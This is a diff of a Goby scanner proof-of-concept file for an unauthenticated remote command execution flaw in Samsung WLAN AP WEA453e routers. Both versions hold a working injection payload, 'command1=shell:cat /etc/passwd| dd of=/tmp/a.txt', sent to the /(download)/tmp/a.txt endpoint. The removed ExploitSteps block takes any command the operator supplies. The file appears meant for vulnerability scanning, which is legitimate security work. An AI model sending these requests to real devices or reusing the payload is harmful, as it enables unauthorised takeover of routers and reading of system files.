@@ -1,42 +1,30 @@
 {
       "Name": "Samsung WLAN AP WEA453e RCE",
       "Level": "3",
-      "Tags": [
-            "rce"
-      ],
-      "GobyQuery": "title=\"Samsung WLAN AP\" || app=\"Chunjs-server\" && body=\"Samsung Electronics\"",
-      "Description": "Samsung WLAN AP WEA453e",
-      "Product": "Samsung WLAN AP WEA453e",
+      "Tags": [],
+      "GobyQuery": "title==\"Samsung WLAN AP\"",
+      "Description": "三星 WLAN AP WEA453e路由器  存在远程命令执行漏洞，可在未授权的情况下执行任意命令获取服务器权限",
+      "Product": "三星 WLAN AP WEA453e路由器",
       "Homepage": "https://www.samsung.com/",
-      "Author": "",
-      "Impact": "Samsung WLAN AP wea453e router has a remote command execution vulnerability.",
-      "Recommendation": "",
-      "References": [],
-      "HasExp": true,
-      "ExpParams": [
-            {
-                  "Name": "Cmd",
-                  "Type": "input",
-                  "Value": "cat /etc/passwd"
-            }
+      "Author": "lxy@secbug.org",
+      "Impact": "<p>暂无</p>",
+      "Recommandation": "<p>暂无</p>",
+      "References": [
+            "Internet"
       ],
-      "ExpTips": {
-            "Type": "",
-            "Content": ""
-      },
       "ScanSteps": [
             "AND",
             {
                   "Request": {
-                        "method": "GET",
+                        "method": "POST",
                         "uri": "/(download)/tmp/a.txt",
-                        "follow_redirect": false,
+                        "follow_redirect": true,
                         "header": {
-                              "Content-Type": "application/json;charset=UTF-8"
+                              "Connection": "close",
+                              "Content-Length": "48"
                         },
                         "data_type": "text",
-                        "data": "command1=shell:cat /etc/passwd| dd of=/tmp/a.txt",
-                        "set_variable": []
+                        "data": "command1=shell:cat /etc/passwd| dd of=/tmp/a.txt"
                   },
                   "ResponseTest": {
                         "type": "group",
@@ -58,43 +46,9 @@
                               }
                         ]
                   },
-                  "SetVariable": [
-                        "output|lastbody|regex|"
-                  ]
+                  "SetVariable": []
             }
       ],
-      "ExploitSteps": [
-            "AND",
-            {
-                  "Request": {
-                        "method": "GET",
-                        "uri": "/(download)/tmp/a.txt",
-                        "follow_redirect": false,
-                        "header": {
-                              "Content-Type": "application/json;charset=UTF-8"
-                        },
-                        "data_type": "text",
-                        "data": "command1=shell:{{{Cmd}}}| dd of=/tmp/a.txt",
-                        "set_variable": []
-                  },
-                  "ResponseTest": {
-                        "type": "group",
-                        "operation": "AND",
-                        "checks": [
-                              {
-                                    "type": "item",
-                                    "variable": "$code",
-                                    "operation": "==",
-                                    "value": "200",
-                                    "bz": ""
-                              }
-                        ]
-                  },
-                  "SetVariable": [
-                        "output|lastbody|regex|"
-                  ]
-            }
-      ],
-      "PostTime": "0000-00-00 00:00:00",
-      "GobyVersion": "0.0.0"
+      "PostTime": "2021-04-01 11:47:39",
+      "GobyVersion": "1.8.237"
 }
